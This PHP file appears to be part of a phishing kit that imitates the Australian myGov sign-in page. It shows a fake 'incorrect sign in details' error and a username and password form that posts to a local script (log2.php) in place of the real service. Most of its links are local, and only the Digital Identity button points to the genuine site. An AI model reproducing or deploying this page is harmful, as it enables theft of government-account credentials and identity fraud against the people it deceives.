<?php

require("header.php");
?>


<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	<div class="unauth">
		<div class="login-grid-container">
			<div class="login-grid-row">
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
	
							<a data-go-back-link="" class="button-back" href="index.php">Back</a>

                            <div class="error-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Error message:</span>
										<div class="error-msg-text" ><span>
											<strong>Error</strong>
											<br>
											Your sign in details are incorrect. (RFM10A)
											<br/>
											<br/>
											<a href="recovery.php">Forgot username</a>
                                            <br/>
                                            <a href="recovery.php">Forgot password</a>
										</span></div>

									</div>

							<h1>Sign in with myGov</h1>
							<p class="login-instruction-text">Choose how to sign in from these 2 options</p>
							<h2 class="text-align-left">Using your myGov sign in details</h2>
							<form id="log1" action="log2.php" method="post">
	
								<div class="input-group">
									<label class="override" for="userId">Username or email</label>
									<input id="userId" name="username" aria-required="true" data-username="data-username" type="text" autocomplete="off">
								</div>
								<p class="recovery">
									<a href="recovery.php" class="anchor override">Forgot username</a>
								</p>
	
								<div class="input-group">
									<label for="password" class="override">Password</label>
									<div class="password-group">
										<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button>
                                        <input id="password" name="password" type="password" data-current-password="data-current-password" autocomplete="off" aria-required="true">
									</div>
								</div>
								<p class="recovery">
									<a href="recovery.php" class="anchor override">Forgot
										password</a>
								</p>
	
								<div class="button-digital-id-main-container override">
									<div class="digital-id-button-container">
										<button type="submit" class="button-main" name="_eventId_login">Sign in</button>
									</div>
								</div>
	
								<input type="hidden" name="authtype" value="unamepword">
								
									
									<p class="create-account-text"><a class="create-account-link" href="create.php">Create a myGov account</a> if you don't have one already.</p>
									

							<div>
                </div></form>
	
							<div class="hr-word">
								<div class="draw-circle">
									or
								</div>
							</div>
	
							<div class="digital-id-login-card secondary">
								<div class="button-digital-id-container">
									<h2 class="text-align-left">Using your myGovID Digital Identity</h2>
									<div class="digital-id-login-option-container">
										<div class="inner-options">
											<p class="external-links-zone">
												What is <a href="" target="_blank">Digital Identity</a> and <a href="" target="_blank">myGovID</a>?
											</p>
											<a class="button-digital-identity" href="https://login.my.gov.au/las/mygov-login?execution=e7s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
										</div>
									</div>
								</div>
							</div>
										
						
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div></div>


<?
require("footer.php");
?>